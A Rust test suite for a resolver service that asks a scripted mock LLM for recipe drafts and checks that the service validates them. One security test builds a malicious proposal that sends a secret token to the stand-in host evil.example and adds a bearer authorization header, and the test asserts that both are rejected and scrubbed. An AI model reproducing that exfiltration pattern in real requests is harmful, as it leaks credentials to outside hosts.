//! Model-assisted drafts (`docs/architecture.md` §11.11, P3b-b v0.12).
//!
//! When a successful exploration's action chain cannot be distilled
//! deterministically, the service may spend **one** extra model call (within the
//! remaining `max_llm_calls` budget) to let the provider propose an
//! `rdm.recipe/v1` draft. The proposal is treated as untrusted input: it is
//! parsed, hard-validated (identity/match/steps/no credentials/sensitive query
//! names) and only then saved as a local draft — any failure only warns and
//! never changes the successful exploration outcome.
//!
//! Fixtures are the shared loopback MockServer + scripted mock LLM; no public
//! network and no real model.

mod common;
mod support;

use std::path::PathBuf;

use common::llm::{LlmReply, MockLlm};
use common::RecipeFixture;
use rdm_resolve::{
    drafts_root, list_drafts, load_draft, AiConfig, Budget, ResolveMode, ResolvePolicy,
    ResolveRequest, ResolverService, RunStatus, DRAFT_SCHEMA,
};
use serde_json::{json, Value};
use support::{MockServer, Reply};
use url::Url;

const API_KEY: &str = "sk-p3bb-scripted-key-0123456789";
/// Marker embedded in the malicious model proposals; it must never surface.
const SECRET_MARK: &str = "SUPERSECRET-P3BB";

// ---------------------------------------------------------------------------
// Harness
// ---------------------------------------------------------------------------

fn scrub_ambient_env_key() {
    static ONCE: std::sync::Once = std::sync::Once::new();
    ONCE.call_once(|| std::env::remove_var("RDM_AI_API_KEY"));
}

fn ai_config(llm: &MockLlm) -> AiConfig {
    scrub_ambient_env_key();
    AiConfig {
        enabled: true,
        base_url: llm.config_base_url(),
        model: "scripted-model".to_owned(),
        api_key: API_KEY.to_owned(),
        ..AiConfig::default()
    }
}

fn resolve_root(fixture: &RecipeFixture) -> PathBuf {
    fixture.state_dir().join("resolve")
}

fn draft_path(fixture: &RecipeFixture, id: &str, version: u32) -> PathBuf {
    drafts_root(&resolve_root(fixture)).join(format!("{id}@{version}.json"))
}

fn runs_dir(fixture: &RecipeFixture) -> PathBuf {
    resolve_root(fixture).join("runs")
}

fn explore_request(url: &str, max_llm_calls: Option<u32>) -> ResolveRequest {
    ResolveRequest {
        url: url.to_owned(),
        mode: ResolveMode::Explore,
        max_llm_calls,
        budget: Some(Budget {
            wall_ms: 20_000,
            ..Budget::default()
        }),
        ..ResolveRequest::default()
    }
}

// ---------------------------------------------------------------------------
// Fixture site
// ---------------------------------------------------------------------------

/// HTML share page linking `/files/42.bin`; everything else is the file.
async fn share_site() -> MockServer {
    MockServer::start(|request| {
        let host = request.header("host").unwrap_or("127.0.0.1").to_owned();
        if request.path == "/page" {
            return Reply::html(&format!(
                "<!doctype html><html><body>\
                 <a href=\"http://{host}/files/42.bin\">Download</a>\
                 </body></html>"
            ));
        }
        match request.path.as_str() {
            "/files/42.bin" => match request.method.as_str() {
                "HEAD" => Reply::file_head(2048).header("accept-ranges", "bytes"),
                _ => Reply::file(2048).header("accept-ranges", "bytes"),
            },
            _ => Reply::status(404),
        }
    })
    .await
}

// ---------------------------------------------------------------------------
// Scripted exploration helpers
// ---------------------------------------------------------------------------

fn page_read(url: &str) -> LlmReply {
    LlmReply::content(json!({ "action": "page_read", "url": url }).to_string())
}

fn http_head(url: &str) -> LlmReply {
    LlmReply::content(json!({ "action": "http_request", "method": "HEAD", "url": url }).to_string())
}

fn first_obs_id(body: &str) -> String {
    let regex = regex::Regex::new(r"obs_[0-9]+_[0-9]+").expect("obs id regex");
    let found = regex
        .find_iter(body)
        .map(|hit| hit.as_str())
        .next()
        .map(str::to_owned);
    found.unwrap_or_else(|| panic!("expected an observation id in the request body:\n{body}"))
}

fn last_obs_id(body: &str) -> String {
    let regex = regex::Regex::new(r"obs_[0-9]+_[0-9]+").expect("obs id regex");
    let found = regex
        .find_iter(body)
        .map(|hit| hit.as_str())
        .last()
        .map(str::to_owned);
    found.unwrap_or_else(|| panic!("expected an observation id in the request body:\n{body}"))
}

fn emit_page_link(file_url: impl Into<String>) -> LlmReply {
    let file_url = file_url.into();
    LlmReply::dynamic(move |request| {
        let obs = first_obs_id(&request.body);
        json!({
            "action": "emit_manifest",
            "resources": [{
                "url": file_url,
                "evidence": format!("{obs}#links/0"),
            }]
        })
        .to_string()
    })
}

fn emit_plain_obs(file_url: impl Into<String>) -> LlmReply {
    let file_url = file_url.into();
    LlmReply::dynamic(move |request| {
        let obs = last_obs_id(&request.body);
        json!({
            "action": "emit_manifest",
            "resources": [{ "url": file_url, "evidence": obs }]
        })
        .to_string()
    })
}

fn host_of(url: &str) -> String {
    Url::parse(url)
        .expect("fixture URL")
        .host_str()
        .expect("host")
        .to_owned()
}

// ---------------------------------------------------------------------------
// Model proposal builders
// ---------------------------------------------------------------------------

fn recipe(_host: &str, emit_url: &str, steps: Value, tests: Value, matcher: Value) -> String {
    json!({
        "schema": "rdm.recipe/v1",
        "id": "model-suggested-recipe",
        "version": 9,
        "match": matcher,
        "steps": steps,
        "emit": { "url": emit_url },
        "tests": tests,
    })
    .to_string()
}

fn assert_step(id: &str) -> Value {
    json!({
        "id": id,
        "op": "assert",
        "args": { "kind": "equals", "value": "ok", "expected": "ok" }
    })
}

/// A valid model proposal: host match, one assert, literal emit, empty tests.
fn valid_model_recipe(source_url: &str, emit_url: &str) -> String {
    recipe(
        &host_of(source_url),
        emit_url,
        json!([assert_step("check")]),
        json!([]),
        json!({ "hosts": [host_of(source_url)] }),
    )
}

// ---------------------------------------------------------------------------
// Scenarios
// ---------------------------------------------------------------------------

/// Exploration that succeeds but is **not** deterministically expressible:
/// `http_request HEAD file` + plain-observation emit (2 model calls).
fn unexpressible_scripts(file_url: &str) -> Vec<LlmReply> {
    vec![http_head(file_url), emit_plain_obs(file_url)]
}

/// Exploration that succeeds **and** is deterministically expressible:
/// `page_read page` + `emit links/0` (2 model calls, deterministic draft).
fn expressible_scripts(page_url: &str, file_url: &str) -> Vec<LlmReply> {
    vec![page_read(page_url), emit_page_link(file_url)]
}

fn assert_no_model_assisted_notes(outcome: &rdm_resolve::ResolveOutcome) {
    if let Some(manifest) = &outcome.manifest {
        assert!(
            !manifest
                .notes
                .iter()
                .any(|note| note.contains("model-assisted")),
            "unexpected model-assisted note: {:?}",
            manifest.notes
        );
    }
}

// ---------------------------------------------------------------------------
// 1. Success: one extra call yields a validated, saved model-assisted draft
// ---------------------------------------------------------------------------

#[tokio::test]
async fn model_assisted_draft_is_generated_and_saved() {
    let site = share_site().await;
    let page_url = site.url("/page");
    let file_url = site.url("/files/42.bin");
    let fixture = RecipeFixture::new("p3bb-success");
    let mut scripts = unexpressible_scripts(&file_url);
    scripts.push(LlmReply::content(valid_model_recipe(&page_url, &file_url)));
    let llm = MockLlm::start(scripts).await;
    let mut service = fixture.service().with_ai_config(ai_config(&llm));

    let outcome = service.resolve(explore_request(&page_url, None)).await;

    assert_eq!(outcome.status, RunStatus::Succeeded);
    assert_eq!(
        outcome.diagnostics.llm_calls, 3,
        "two exploration calls + one model-assisted draft call"
    );
    assert_eq!(llm.request_count(), 3);

    let manifest = outcome.manifest.as_ref().expect("manifest");
    assert_eq!(manifest.downloadable().count(), 1);
    assert!(
        manifest
            .notes
            .iter()
            .any(|note| note.contains("model-assisted draft saved")),
        "manifest.notes: {:?}",
        manifest.notes
    );

    let draft_ref = outcome.recipe.as_ref().expect("model-assisted draft ref");
    assert_eq!(draft_ref.state, "draft");
    assert!(draft_ref.id.starts_with("draft_"), "{}", draft_ref.id);
    assert_eq!(draft_ref.version, 1);

    let path = draft_path(&fixture, &draft_ref.id, draft_ref.version);
    assert!(path.is_file(), "missing draft file {path:?}");
    let raw: Value = serde_json::from_str(&std::fs::read_to_string(&path).expect("read draft"))
        .expect("draft JSON");
    assert_eq!(raw["schema"], DRAFT_SCHEMA);
    assert_eq!(raw["id"], draft_ref.id);

    let draft = load_draft(&resolve_root(&fixture), &draft_ref.id).expect("load draft");
    assert_eq!(draft.version, 1);
    assert_eq!(draft.recipe.version, 1, "validation forces version = 1");
    assert_eq!(
        draft.recipe.id, draft_ref.id,
        "validation forces the draft id"
    );
    assert_eq!(draft.scope_hint, "narrow");
    assert!(draft
        .notes
        .iter()
        .any(|note| note.contains("model-assisted")));
    assert!(
        draft
            .recipe
            .matches(&Url::parse(&page_url).expect("url"))
            .is_some(),
        "the generated recipe must match the source URL"
    );
    assert!(
        draft.recipe.steps.iter().any(|step| step.op == "assert"),
        "the saved recipe must contain an assert step (R6)"
    );
    assert_eq!(
        draft.recipe.tests.len(),
        1,
        "empty tests are supplemented with sample_input"
    );
    assert_eq!(draft.recipe.tests[0].name, "sample_input");
    assert_eq!(draft.recipe.tests[0].input_url, page_url);
    draft
        .recipe
        .validate()
        .expect("the saved recipe must validate");
}

// ---------------------------------------------------------------------------
// 2. Deterministic distillation wins: no extra model call, no model notes
// ---------------------------------------------------------------------------

#[tokio::test]
async fn deterministic_draft_suppresses_the_model_assisted_call() {
    let site = share_site().await;
    let page_url = site.url("/page");
    let file_url = site.url("/files/42.bin");
    let fixture = RecipeFixture::new("p3bb-deterministic");
    let llm = MockLlm::start(expressible_scripts(&page_url, &file_url)).await;
    let mut service = fixture.service().with_ai_config(ai_config(&llm));

    let outcome = service.resolve(explore_request(&page_url, None)).await;

    assert_eq!(outcome.status, RunStatus::Succeeded);
    assert_eq!(
        outcome.diagnostics.llm_calls, 2,
        "a deterministic draft must not spend an extra model call"
    );
    assert_eq!(llm.request_count(), 2);
    assert_no_model_assisted_notes(&outcome);
    let draft_ref = outcome.recipe.as_ref().expect("deterministic draft ref");
    assert_eq!(draft_ref.state, "draft");
    let draft = load_draft(&resolve_root(&fixture), &draft_ref.id).expect("load draft");
    assert!(
        !draft
            .notes
            .iter()
            .any(|note| note.contains("model-assisted")),
        "the draft came from the deterministic distiller: {:?}",
        draft.notes
    );
    assert!(draft
        .notes
        .iter()
        .any(|note| note.contains("deterministic draft")));
}

// ---------------------------------------------------------------------------
// 3. No remaining model budget: the extra call is not attempted
// ---------------------------------------------------------------------------

#[tokio::test]
async fn model_assisted_draft_respects_the_llm_budget() {
    let site = share_site().await;
    let page_url = site.url("/page");
    let file_url = site.url("/files/42.bin");
    let fixture = RecipeFixture::new("p3bb-budget");
    let mut scripts = unexpressible_scripts(&file_url);
    // A third reply is queued but must never be consumed.
    scripts.push(LlmReply::content(valid_model_recipe(&page_url, &file_url)));
    let llm = MockLlm::start(scripts).await;
    let mut service = fixture.service().with_ai_config(ai_config(&llm));

    let outcome = service.resolve(explore_request(&page_url, Some(2))).await;

    assert_eq!(outcome.status, RunStatus::Succeeded);
    assert_eq!(
        outcome.diagnostics.llm_calls, 2,
        "max_llm_calls == exploration calls leaves no budget for a draft"
    );
    assert_eq!(llm.request_count(), 2, "no extra model request");
    assert!(outcome.recipe.is_none());
    assert_no_model_assisted_notes(&outcome);
    assert!(list_drafts(&resolve_root(&fixture)).is_empty());
}

// ---------------------------------------------------------------------------
// 4. Bad model output: five rejection shapes, success is unchanged
// ---------------------------------------------------------------------------

#[tokio::test]
async fn invalid_model_proposals_are_rejected_without_changing_the_outcome() {
    let cases: Vec<(&str, String)> = vec![
        ("invalid JSON", "this is definitely not a recipe".to_owned()),
        (
            "unknown operator",
            recipe(
                "127.0.0.1",
                "http://127.0.0.1:1/file.bin",
                json!([{
                    "id": "bad",
                    "op": "frobnicate",
                    "args": {}
                }]),
                json!([]),
                json!({ "hosts": ["127.0.0.1"] }),
            ),
        ),
        (
            "non-matching recipe",
            recipe(
                "example.com",
                "https://example.com/file.bin",
                json!([assert_step("check")]),
                json!([]),
                json!({
                    "hosts": ["example.com"],
                    "url_pattern": "^https://example.com/never$"
                }),
            ),
        ),
        (
            "sensitive authorization header",
            recipe(
                "127.0.0.1",
                "http://127.0.0.1:1/file.bin",
                json!([
                    {
                        "id": "api",
                        "op": "http_request",
                        "args": {
                            "method": "GET",
                            "url": "http://127.0.0.1:1/api",
                            "headers": {
                                "Authorization": format!("Bearer {SECRET_MARK}")
                            }
                        },
                        "assign": { "body": "body_text" }
                    },
                    assert_step("check")
                ]),
                json!([]),
                json!({ "hosts": ["127.0.0.1"] }),
            ),
        ),
        (
            "more than 24 steps",
            recipe(
                "127.0.0.1",
                "http://127.0.0.1:1/file.bin",
                Value::Array(
                    (0..25)
                        .map(|index| {
                            json!({
                                "id": format!("s{index}"),
                                "op": "assert",
                                "args": {
                                    "kind": "equals",
                                    "value": "ok",
                                    "expected": "ok"
                                }
                            })
                        })
                        .collect(),
                ),
                json!([]),
                json!({ "hosts": ["127.0.0.1"] }),
            ),
        ),
    ];

    for (label, proposal) in cases {
        let site = share_site().await;
        let page_url = site.url("/page");
        let file_url = site.url("/files/42.bin");
        let fixture = RecipeFixture::new(&format!("p3bb-bad-{}", label.replace(' ', "-")));
        let mut scripts = unexpressible_scripts(&file_url);
        scripts.push(LlmReply::content(proposal));
        let llm = MockLlm::start(scripts).await;
        let mut service = fixture.service().with_ai_config(ai_config(&llm));

        let outcome = service.resolve(explore_request(&page_url, None)).await;

        assert_eq!(outcome.status, RunStatus::Succeeded, "{label}");
        assert_eq!(
            outcome.diagnostics.llm_calls, 3,
            "{label}: extra call counted"
        );
        assert!(
            outcome.recipe.is_none(),
            "{label}: a rejected proposal must not produce a draft"
        );
        assert_no_model_assisted_notes(&outcome);
        assert_eq!(
            list_drafts(&resolve_root(&fixture)).len(),
            0,
            "{label}: no draft file may be saved"
        );
        let encoded = serde_json::to_string(&outcome).expect("serialize outcome");
        assert!(
            !encoded.contains(SECRET_MARK),
            "{label}: the malicious value leaked into the outcome"
        );
    }
}

// ---------------------------------------------------------------------------
// 5. Provider error during the draft call: only a warning, success unchanged
// ---------------------------------------------------------------------------

#[tokio::test]
async fn model_assisted_draft_provider_error_does_not_change_the_outcome() {
    let site = share_site().await;
    let page_url = site.url("/page");
    let file_url = site.url("/files/42.bin");
    let fixture = RecipeFixture::new("p3bb-provider-error");
    let mut scripts = unexpressible_scripts(&file_url);
    scripts.push(LlmReply::status(500));
    let llm = MockLlm::start(scripts).await;
    let mut service = fixture.service().with_ai_config(ai_config(&llm));

    let outcome = service.resolve(explore_request(&page_url, None)).await;

    assert_eq!(outcome.status, RunStatus::Succeeded);
    assert_eq!(
        outcome.diagnostics.llm_calls, 3,
        "a failed draft call is still counted"
    );
    assert!(outcome.recipe.is_none());
    assert_no_model_assisted_notes(&outcome);
    assert!(list_drafts(&resolve_root(&fixture)).is_empty());
    assert_eq!(
        outcome
            .manifest
            .as_ref()
            .expect("manifest")
            .downloadable()
            .count(),
        1,
        "the exploration result is untouched"
    );
}

// ---------------------------------------------------------------------------
// 6. No state root: the model-assisted path is never attempted
// ---------------------------------------------------------------------------

#[tokio::test]
async fn no_state_root_means_no_model_assisted_call() {
    let site = share_site().await;
    let page_url = site.url("/page");
    let file_url = site.url("/files/42.bin");
    let mut scripts = unexpressible_scripts(&file_url);
    scripts.push(LlmReply::content(valid_model_recipe(&page_url, &file_url)));
    let llm = MockLlm::start(scripts).await;
    let mut service = ResolverService::new(
        rdm_resolve::RecipeRegistry::empty(),
        ResolvePolicy::loopback(),
    )
    .with_ai_config(ai_config(&llm));
    assert!(service.trace_root().is_none());

    let outcome = service.resolve(explore_request(&page_url, None)).await;

    assert_eq!(outcome.status, RunStatus::Succeeded);
    assert_eq!(
        outcome.diagnostics.llm_calls, 2,
        "there is nowhere to save a draft, so no extra call is made"
    );
    assert_eq!(llm.request_count(), 2);
    assert!(outcome.recipe.is_none());
    assert_no_model_assisted_notes(&outcome);
}

// ---------------------------------------------------------------------------
// 7. Security: a draft carrying tokens / auth headers is rejected and scrubbed
// ---------------------------------------------------------------------------

#[tokio::test]
async fn malicious_model_draft_is_rejected_and_secrets_do_not_leak() {
    let site = share_site().await;
    let page_url = site.url("/page");
    let file_url = site.url("/files/42.bin");
    let fixture = RecipeFixture::new("p3bb-security");
    let secret_url = format!("https://evil.example/x?token={SECRET_MARK}");
    // The proposal smuggles both a token query parameter (in the emit URL) and
    // an authorization header into a step.
    let proposal = recipe(
        "127.0.0.1",
        &secret_url,
        json!([
            {
                "id": "api",
                "op": "http_request",
                "args": {
                    "method": "GET",
                    "url": "http://127.0.0.1:1/api",
                    "headers": { "authorization": format!("Bearer {SECRET_MARK}") }
                },
                "assign": { "body": "body_text" }
            },
            assert_step("check")
        ]),
        json!([]),
        json!({ "hosts": ["127.0.0.1"] }),
    );
    let mut scripts = unexpressible_scripts(&file_url);
    scripts.push(LlmReply::content(proposal));
    let llm = MockLlm::start(scripts).await;
    let mut service = fixture.service().with_ai_config(ai_config(&llm));

    let outcome = service.resolve(explore_request(&page_url, None)).await;

    assert_eq!(outcome.status, RunStatus::Succeeded);
    assert_eq!(outcome.diagnostics.llm_calls, 3);
    assert!(
        outcome.recipe.is_none(),
        "a proposal with a token URL / authorization header is rejected"
    );
    assert!(list_drafts(&resolve_root(&fixture)).is_empty());

    // The secret never reaches the outcome JSON, diagnostics or the trace.
    let encoded = serde_json::to_string(&outcome).expect("serialize outcome");
    assert!(!encoded.contains(SECRET_MARK), "outcome leaked the secret");
    assert!(!outcome.diagnostics.summary.contains(SECRET_MARK));
    let mut traces = 0usize;
    if let Ok(entries) = std::fs::read_dir(runs_dir(&fixture)) {
        for entry in entries.flatten() {
            let path = entry.path();
            if path.extension().and_then(|ext| ext.to_str()) != Some("jsonl") {
                continue;
            }
            traces += 1;
            let raw = std::fs::read_to_string(&path).expect("read trace");
            assert!(
                !raw.contains(SECRET_MARK),
                "trace {} leaked the secret: {raw}",
                path.display()
            );
        }
    }
    assert_eq!(traces, 1, "exactly one merged trace is persisted");
}
